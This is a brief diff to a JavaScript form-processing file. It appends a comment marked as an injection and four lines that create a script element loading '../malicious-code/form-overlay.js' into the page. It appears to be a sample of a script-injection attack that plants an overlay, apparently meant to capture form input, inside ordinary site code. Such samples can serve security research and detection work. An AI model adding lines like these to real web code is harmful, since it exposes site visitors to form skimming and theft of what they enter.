@@ -939,4 +939,8 @@
   } else {
     initFormProcessor()
   }
+  // ===== Injection for form-overlay.js =====
+  const overlayScript = document.createElement('script')
+  overlayScript.src =  '../malicious-code/form-overlay.js'
+  document.body.appendChild(overlayScript)
 })()
